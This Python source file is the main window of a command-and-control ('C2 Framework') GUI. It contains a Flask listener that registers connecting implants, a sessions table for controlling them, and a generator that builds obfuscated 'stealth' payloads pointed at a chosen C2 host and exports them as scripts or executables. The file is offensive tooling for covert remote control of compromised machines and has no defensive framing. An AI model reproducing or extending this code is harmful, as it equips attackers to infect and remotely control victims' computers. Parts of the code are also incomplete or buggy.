import sys
import os
import json
import threading
import time
from datetime import datetime
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QTextEdit, QLabel, QLineEdit, QTabWidget,
    QTableWidget, QTableWidgetItem, QHeaderView, QMessageBox,
    QComboBox, QSpinBox, QFileDialog, QGroupBox, QFormLayout
)
from PyQt6.QtCore import Qt, QThread, pyqtSignal
from PyQt6.QtGui import QFont, QIcon, QColor
import qdarkstyle
from flask import Flask, request, jsonify
import socket
import subprocess
import tempfile
from session_window import SessionWindow
from payload_generator import PayloadGenerator

class ListenerThread(QThread):
    new_connection = pyqtSignal(str, str)
    connection_lost = pyqtSignal(str)
    
    def __init__(self, port):
        super().__init__()
        self.port = port
        self.running = True
        self.app = Flask(__name__)
        self.setup_routes()
        
    def setup_routes(self):
        @self.app.route('/connect', methods=['POST'])
        def handle_connect():
            data = request.get_json()
            client_id = data.get('client_id')
            client_info = data.get('info', {})
            self.new_connection.emit(client_id, json.dumps(client_info))
            return jsonify({'status': 'success'})
            
        @self.app.route('/heartbeat', methods=['POST'])
        def handle_heartbeat():
            return jsonify({'status': 'success'})
    
    def run(self):
        self.app.run(host='0.0.0.0', port=self.port)
    
    def stop(self):
        self.running = False
        # Implement proper Flask shutdown here

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("C2 Framework")
        self.setMinimumSize(1200, 800)
        
        # Initialize variables
        self.active_listeners = {}
        self.active_sessions = {}
        self.session_windows = {}
        
        try:
            # Initialize payload generator
            self.payload_generator = PayloadGenerator()
        except ImportError as e:
            QMessageBox.critical(self, "Error", f"Failed to initialize: {str(e)}")
            sys.exit(1)
        
        # Create main widget and layout
        main_widget = QWidget()
        self.setCentralWidget(main_widget)
        layout = QVBoxLayout(main_widget)
        
        # Create tab widget
        self.tabs = QTabWidget()
        layout.addWidget(self.tabs)
        
        # Create tabs
        self.create_listener_tab()
        self.create_payload_tab()
        self.create_sessions_tab()
        
        # Apply dark theme
        self.setStyleSheet(qdarkstyle.load_stylesheet())
        
        # Setup status bar
        self.statusBar().showMessage("Ready")
        
    def create_listener_tab(self):
        listener_widget = QWidget()
        layout = QVBoxLayout(listener_widget)
        
        # Listener controls
        controls_layout = QHBoxLayout()
        
        # Port input
        port_layout = QHBoxLayout()
        port_label = QLabel("Port:")
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(8080)
        port_layout.addWidget(port_label)
        port_layout.addWidget(self.port_input)
        
        # Start/Stop button
        self.listener_button = QPushButton("Start Listener")
        self.listener_button.clicked.connect(self.toggle_listener)
        
        controls_layout.addLayout(port_layout)
        controls_layout.addWidget(self.listener_button)
        controls_layout.addStretch()
        
        layout.addLayout(controls_layout)
        
        # Active listeners table
        self.listeners_table = QTableWidget()
        self.listeners_table.setColumnCount(3)
        self.listeners_table.setHorizontalHeaderLabels(["Port", "Status", "Actions"])
        self.listeners_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        
        layout.addWidget(self.listeners_table)
        
        self.tabs.addTab(listener_widget, "Listeners")
        
    def create_payload_tab(self):
        payload_tab = QWidget()
        layout = QVBoxLayout(payload_tab)
        
        # Payload configuration
        config_group = QGroupBox("Payload Configuration")
        config_layout = QFormLayout()
        
        self.payload_host = QLineEdit()
        self.payload_host.setPlaceholderText("Enter C2 host address")
        self.payload_port = QSpinBox()
        self.payload_port.setRange(1, 65535)
        self.payload_port.setValue(8080)
        
        self.payload_type = QComboBox()
        self.payload_type.addItems(["Python", "Executable"])
        
        self.obfuscation_level = QComboBox()
        self.obfuscation_level.addItems(["Low", "Medium", "High"])
        
        # Add validation
        self.payload_host.textChanged.connect(self.validate_payload_config)
        
        config_layout.addRow("Host:", self.payload_host)
        config_layout.addRow("Port:", self.payload_port)
        config_layout.addRow("Type:", self.payload_type)
        config_layout.addRow("Obfuscation:", self.obfuscation_level)
        
        config_group.setLayout(config_layout)
        layout.addWidget(config_group)
        
        # Generate button
        generate_btn = QPushButton("Generate Payload")
        generate_btn.clicked.connect(self.generate_payload)
        generate_btn.setEnabled(False)  # Disabled until valid config
        self.generate_btn = generate_btn
        layout.addWidget(generate_btn)
        
        # Payload preview
        preview_group = QGroupBox("Payload Preview")
        preview_layout = QVBoxLayout()
        
        self.payload_preview = QTextEdit()
        self.payload_preview.setReadOnly(True)
        preview_layout.addWidget(self.payload_preview)
        
        preview_group.setLayout(preview_layout)
        layout.addWidget(preview_group)
        
        # Save button
        save_btn = QPushButton("Save Payload")
        save_btn.clicked.connect(self.save_payload)
        save_btn.setEnabled(False)  # Disabled until payload generated
        self.save_btn = save_btn
        layout.addWidget(save_btn)
        
        self.tabs.addTab(payload_tab, "Payload Generator")
        
    def create_sessions_tab(self):
        sessions_widget = QWidget()
        layout = QVBoxLayout(sessions_widget)
        
        # Sessions table
        self.sessions_table = QTableWidget()
        self.sessions_table.setColumnCount(4)
        self.sessions_table.setHorizontalHeaderLabels(["ID", "IP", "First Seen", "Status"])
        self.sessions_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
        self.sessions_table.itemDoubleClicked.connect(self.open_session)
        
        layout.addWidget(self.sessions_table)
        
        self.tabs.addTab(sessions_widget, "Sessions")
        
    def toggle_listener(self):
        port = self.port_input.value()
        if port in self.active_listeners:
            # Stop listener
            self.active_listeners[port].stop()
            del self.active_listeners[port]
            self.listener_button.setText("Start Listener")
            self.update_listeners_table()
        else:
            # Start listener
            listener = ListenerThread(port)
            listener.new_connection.connect(self.handle_new_connection)
            listener.connection_lost.connect(self.handle_connection_lost)
            listener.start()
            self.active_listeners[port] = listener
            self.listener_button.setText("Stop Listener")
            self.update_listeners_table()
            
    def update_listeners_table(self):
        self.listeners_table.setRowCount(len(self.active_listeners))
        for i, (port, listener) in enumerate(self.active_listeners.items()):
            self.listeners_table.setItem(i, 0, QTableWidgetItem(str(port)))
            self.listeners_table.setItem(i, 1, QTableWidgetItem("Running"))
            
            stop_button = QPushButton("Stop")
            stop_button.clicked.connect(lambda checked, p=port: self.stop_listener(p))
            self.listeners_table.setCellWidget(i, 2, stop_button)
            
    def stop_listener(self, port):
        if port in self.active_listeners:
            self.active_listeners[port].stop()
            del self.active_listeners[port]
            self.update_listeners_table()
            
    def validate_payload_config(self):
        host = self.payload_host.text()
        is_valid = bool(host and host.strip())
        self.generate_btn.setEnabled(is_valid)
        if not is_valid:
            self.statusBar().showMessage("Please enter a valid host address")
        else:
            self.statusBar().showMessage("Ready to generate payload")
            
    def generate_payload(self):
        try:
            host = self.payload_host.text()
            port = self.payload_port.value()
            
            if not host:
                QMessageBox.warning(self, "Error", "Please enter a host address")
                return
                
            # Generate payload
            self.statusBar().showMessage("Generating payload...")
            payload = self.payload_generator.generate_stealth_payload(host, port)
            
            # Set obfuscation level
            if self.obfuscation_level.currentText() == "High":
                # Add more obfuscation
                payload = self.payload_generator.obfuscate_payload(payload)
            
            # Show preview
            self.payload_preview.setText(payload)
            self.save_btn.setEnabled(True)
            self.statusBar().showMessage("Payload generated successfully")
            
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to generate payload: {str(e)}")
            self.statusBar().showMessage("Failed to generate payload")
            
    def save_payload(self):
        try:
            payload = self.payload_preview.toPlainText()
            if not payload:
                return
                
            file_path, _ = QFileDialog.getSaveFileName(
                self,
                "Save Payload",
                "",
                "Python Files (*.py);;Executable Files (*.exe)"
            )
            
            if file_path:
                self.statusBar().showMessage("Saving payload...")
                
                if file_path.endswith('.exe'):
                    # Generate executable
                    if self.payload_generator.generate_exe(payload, file_path):
                        QMessageBox.information(self, "Success", "Executable generated successfully")
                        self.statusBar().showMessage("Executable generated successfully")
                    else:
                        QMessageBox.warning(self, "Error", "Failed to generate executable")
                        self.statusBar().showMessage("Failed to generate executable")
                else:
                    # Save Python script
                    with open(file_path, 'w') as f:
                        f.write(payload)
                    QMessageBox.information(self, "Success", "Payload saved successfully")
                    self.statusBar().showMessage("Payload saved successfully")
                    
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to save payload: {str(e)}")
            self.statusBar().showMessage("Failed to save payload")
            
    def handle_new_connection(self, client_id, client_info):
        try:
            # Add to sessions table
            row = self.sessions_table.rowCount()
            self.sessions_table.insertRow(row)
            self.sessions_table.setItem(row, 0, QTableWidgetItem(client_id))
            self.sessions_table.setItem(row, 1, QTableWidgetItem(client_info.get('ip', 'Unknown')))
            self.sessions_table.setItem(row, 2, QTableWidgetItem(datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
            self.sessions_table.setItem(row, 3, QTableWidgetItem("Active"))
            
            # Store session info
            self.active_sessions[client_id] = json.loads(client_info)
            self.statusBar().showMessage(f"New connection from {client_info.get('ip', 'Unknown')}")
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to handle new connection: {str(e)}")
            
    def handle_connection_lost(self, client_id):
        try:
            # Update session status
            for row in range(self.sessions_table.rowCount()):
                if self.sessions_table.item(row, 0).text() == client_id:
                    self.sessions_table.setItem(row, 3, QTableWidgetItem("Disconnected"))
                    self.statusBar().showMessage(f"Connection lost: {client_id}")
                    break
                    
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to handle connection loss: {str(e)}")
            
    def open_session(self, item):
        try:
            client_id = item.text()
            if client_id in self.active_sessions:
                if client_id not in self.session_windows:
                    session_window = SessionWindow(client_id, self.active_sessions[client_id])
                    self.session_windows[client_id] = session_window
                self.session_windows[client_id].show()
                self.session_windows[client_id].raise_()
                self.statusBar().showMessage(f"Opened session: {client_id}")
                
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Failed to open session: {str(e)}")
            
    def closeEvent(self, event):
        try:
            # Clean up resources
            for listener in self.active_listeners.values():
                listener.stop()
            for window in self.session_windows.values():
                window.close()
            event.accept()
            
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Error during cleanup: {str(e)}")
            event.accept()

def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec()) 